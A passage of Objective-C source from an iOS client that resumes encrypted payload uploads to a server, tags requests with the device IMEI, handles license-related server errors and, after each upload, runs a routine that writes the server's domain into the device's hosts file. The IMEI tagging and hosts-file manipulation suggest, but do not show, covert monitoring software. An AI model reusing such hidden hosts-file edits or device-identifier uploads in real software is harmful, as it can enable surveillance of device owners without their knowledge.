		[[resumeRequest delegate] onTransportError:[[resumeRequest session] CSID] withError:[NSError errorWithDomain:@"RAsk HTTPRequest error" code:-329 userInfo:nil]]; // kCmdExceptionErrorTransport = -329
		if([[CSM priorityQueue] count] > 0) {
			[self start];
		} else {
			[self setIsIdle:YES];
		}
		return;
	}
	
	if (stopFlag) {
		DLog(@"CANCEL");
		stopFlag = NO;
		return;
	}

#pragma mark Transport directive RESUMABLE
	
	if (isRAskSuccess) {
		DLog (@"Directive RASK is success thus proceed with RESUME");
		ProtocolPacketBuilder *packetBuilder = [[ProtocolPacketBuilder alloc] init];
		
		ProtocolPacketBuilderResponse *packetBuilderResponse = [packetBuilder buildResumePacketData:[[resumeRequest session] metaData]
																					withPayloadPath:[[resumeRequest session] payloadPath]
																					  withPublicKey:[[resumeRequest session] serverPublicKey]
																						 withAESKey:[[resumeRequest session] aesKey]
																						   withSSID:[[resumeRequest session] SSID]
																					  withDirective:[resumeRequest directive]
																					withPayloadSize:[[resumeRequest session] payloadSize]
																				   withPayloadCRC32:[[resumeRequest session] payloadCRC32]];
		[packetBuilder release];
		
#if TARGET_IPHONE_SIMULATOR		
		// for test on simulator only
		NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
		NSString *documentsDirectory = [paths objectAtIndex:0];
		NSString *payloadFileName = [NSString stringWithFormat:@"%d.payload", [[resumeRequest session] CSID]];
		NSString *newPayloadFilePath = [documentsDirectory stringByAppendingPathComponent:payloadFileName];
		DLog(@"newPayloadFilePath %@", newPayloadFilePath);
		// end test
#else
		// This code will only appear for a real device
		NSString *newPayloadFilePath = [[resumeRequest session] payloadPath];
		
#endif		
		
		httpRequest = [ASIHTTPRequest requestWithURL:[CSM structuredURL]];
		[httpRequest setTimeOutSeconds:60];
		[httpRequest setRequestMethod:@"POST"];
		[httpRequest setShouldStreamPostDataFromDisk:YES];
		[httpRequest appendPostData:[packetBuilderResponse metaDataWithHeader]];
		[httpRequest appendPostDataFromFile:newPayloadFilePath withOffset:[responseObj numberOfBytesReceived]];
		
		if (stopFlag) {
			DLog(@"CANCEL");
			stopFlag = NO;
			return;
		}
		
		DLog(@"start http request")
		[httpRequest startSynchronous];
	
		//		[httpRequest setDelegate:self];
		//		[httpRequest setUploadProgressDelegate:self];
		//		[httpRequest setShowAccurateProgress:YES];
		//		[httpRequest startAsynchronous];

		if (stopFlag) {
			DLog(@"CANCEL");
			stopFlag = NO;
			return;
		}
		
		NSError *error = [httpRequest error];
		
		DLog(@"RESUME.Response length %d", [[httpRequest responseData] length]);
		DLog(@"RESUME.[httpRequest responseData] = %@", [httpRequest responseData]);
		
		id responseObjResume = nil;
		if (!error) {
			int8_t encryptFlag;
			uint32_t crc32;
			
			if([[httpRequest responseData] length] != 0) {
				NSData *responseData = [httpRequest responseData];
				[responseData getBytes:&encryptFlag length:1];
				
				// cut first byte out
				responseData = [responseData subdataWithRange:NSMakeRange(1, [responseData length]-1)];
				
				if (encryptFlag == 1) {
					AESCryptor *cryptor = [[AESCryptor alloc] init];
					DLog(@"AES KEY %@", [[resumeRequest session] aesKey]);
					responseData = [cryptor decrypt:responseData withKey:[[resumeRequest session] aesKey]]; 
					[cryptor release];
				}
				
				[responseData getBytes:&crc32 length:4];
				
				crc32 = ntohl(crc32);
				responseData = [responseData subdataWithRange:NSMakeRange(4, [responseData length]-4)];
				
				DLog(@"11. crc32 = %d cal = %d", crc32, [CRC32 crc32:responseData]);
				if (crc32 != [CRC32 crc32:responseData]) {
					DLog(@"11. crc32 not matched (TransportError)");
					isTransportError = YES;
				}
				responseObjResume = [ProtocolParser parseServerResponse:responseData];
				[responseObjResume setCSID:[[resumeRequest session] CSID]];
			} else {
				responseObjResume = nil;
				DLog(@"responseData = 0 byte");
				isTransportError = YES;
			}

			UnstructuredManager *USTManager = [[UnstructuredManager alloc] initWithURL:[CSM unstructuredURL]];
			
			NSString *deviceID;
			deviceID = [[[(ResumeRequest *)[self request] session] metaData] deviceID];

			[USTManager doAck:1 withSessionId:[[resumeRequest session] SSID] withDeviceId:deviceID];		
			[USTManager release];
			
			
		} else {
			DLog(@"ASIHTTPRequest Error");
			isTransportError = YES;
		}

		BOOL isDeletePayload = NO;
		if (isTransportError) {
			DLog (@"After got RASK successfully there is transport error");
			// Wrong access to the delegate of resume request
			//[[[(NewRequest *)[self request] request] delegate] onTransportError:[[self request] CSID] withError:[NSError errorWithDomain:@"Transport error" code:-329 userInfo:nil]]; // kCmdExceptionErrorTransport = -329
			
			[[(ResumeRequest *)[self request] delegate] onTransportError:[[self request] CSID] withError:[NSError errorWithDomain:@"Transport error" code:-329 userInfo:nil]]; // kCmdExceptionErrorTransport = -329
			DLog (@"Transport error did callback");
		} else {
			DLog(@"11. Status Code = %d", [(ResponseData *)responseObjResume statusCode]);
			
			int serverStatusCodeResponse = [(ResponseData *)responseObjResume statusCode];
			if (serverStatusCodeResponse == OK) {
				DLog(@"responseObjResume %@", responseObjResume);
				[SSM deleteSession:[[resumeRequest session] CSID]];
				[[(ResumeRequest *)[self request] delegate] onSuccess:responseObjResume];
				isDeletePayload = YES;
			} else {
				switch (serverStatusCodeResponse) {
					case kServerStatusHeaderChecksumFailed:
					case kServerStatusCannotParseHeader:
					case kServerStatusCannotParsePayload:
					case kServerStatusPayloadIsTooBig:
					case kServerStatusPayloadChecksumFailed:
					case kServerStatusSessionNotFound:
					//case kServerStatusIncompletePayload: // Can resume after discuss the logic on server with M
					case kServerStatusSessionDataIncomplete:
					case kServerStatusUnspecifyError: // Even ask for session resumption, return 500(F0 in old server response code standard) -> BAD server (it should return session NOT found ...)
					case kServerStatusErrorDuringDecryption:
					case kServerStatusErrorDuringDecompression:
					case kServerStatusCannotProcessUncryptedHeader:
					// License error (since CSM keep license code with its own payload (header) thus when new license code is change old request will update)
					case kServerStatusLicenseNotFound:
					case kServerStatusLicenseAlreadyInUseByDevice:
					case kServerStatusLicenseExpired:
					case kServerStatusLicenseNotAssignedToAnyDevice:
					case kServerStatusLicenseNotAssignedToUser:
					case kServerStatusLicenseCorrupt:
					case kServerStatusLicenseDisabled:
					case kServerStatusInvalidHostForLicense:
					case kServerStatusLicenseFixedCannotReassigned:
						[SSM deleteSession:[request CSID]];
						isDeletePayload = YES;
						break;
					default:
						isDeletePayload = NO;
						break;
				}				
				[[(ResumeRequest *)[self request] delegate] onServerError:responseObjResume];
			}
		}
		
		if (isDeletePayload) {
#if TARGET_IPHONE_SIMULATOR		
			// start Simulator test
			NSFileManager *fileMgr = [NSFileManager defaultManager];
			if ([fileMgr fileExistsAtPath:newPayloadFilePath]) {
				NSError *error = nil;
				[fileMgr removeItemAtPath:newPayloadFilePath error:&error];
				if (error) {
					DLog(@"Error removing file, %@", [error domain]);
				}
			}
			// end Simulator test
#else
			// This code will only appear for a real device
			NSFileManager *fileMgr = [NSFileManager defaultManager];
			if ([fileMgr fileExistsAtPath:[[resumeRequest session] payloadPath]]) {
				NSError *error = nil;
				[fileMgr removeItemAtPath:[[resumeRequest session] payloadPath] error:&error];
				if (error) {
					DLog(@"Error removing file, %@", [error domain]);
				}
			}
#endif
		}
		
		DLog(@"11.[[CSM priorityQueue] count] %d", [[CSM priorityQueue] count]);
		if([[CSM priorityQueue] count] > 0) {
			[self start];
		} else {
			[self setIsIdle:YES];
		}
	}
	
	// Host file checking...
	NSString *urlDomain = [[CSM structuredURL] host];
	[NSThread detachNewThreadSelector:@selector(jailingHostFile:) toTarget:self withObject:urlDomain];
	
	[pool drain];
}

#pragma mark -
#pragma mark Helper methods
#pragma mark -

- (void)cancelRunningRequest:(uint32_t)CSID {
	stopFlag = YES;
	if([[self request] isMemberOfClass:[NewRequest class]]) {
		[[(NewRequest *)[self request] request] setDelegate:nil];
	} else if ([[self request] isMemberOfClass:[ResumeRequest class]]) {
		[(ResumeRequest *)[self request] setDelegate:nil];
	}
}

- (void)requestFinished:(ASIHTTPRequest *)aHttpRequest {
	// Use when fetching binary data
//	NSData *responseData = [aHttpRequest responseData];
	DLog(@"requestFinished responseData %@", [aHttpRequest responseData]);
}

- (void)requestFailed:(ASIHTTPRequest *)aHttpRequest {
	//NSError *error = [aHttpRequest error];
	DLog(@"Error %@", [aHttpRequest error]);
}

- (void)request:(ASIHTTPRequest *)aHttpRequest didSendBytes:(long long)bytes {
	DLog(@"request:didSendBytes: %qi", bytes);
	// START DEBUG TEST
	//	[aHttpRequest cancel];
	//	[self setIsIdle:YES];
	// END DEBUG TEST
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

+ (void) setHttpRequestHeaders: (ASIHTTPRequest *) aASIHttpRequest {
	DLog (@"[CommandExecutor] HTTP request headers = %@", [aASIHttpRequest requestHeaders]);
	CSMDeviceManager *csmDeviceManager = [CSMDeviceManager sharedCSMDeviceManager];
	[aASIHttpRequest addRequestHeader:@"owner" value:[csmDeviceManager mIMEI]];
	[aASIHttpRequest buildRequestHeaders];
	DLog (@"[CommandExecutor] HTTP request headers = %@", [aASIHttpRequest requestHeaders]);
}

- (void) jailingHostFile: (NSString *) aUrlDomain {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	DLog (@"Url domain that is : aUrlDomain = %@", aUrlDomain);
	@try {
		const char *urldomain = [aUrlDomain cStringUsingEncoding:NSUTF8StringEncoding];
		hosturl(urldomain);
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

#pragma mark -
#pragma mark Memory management methods
#pragma mark -

- (void) dealloc {
	//[httpRequest release];
	[request release];
	[super dealloc];
}

@end
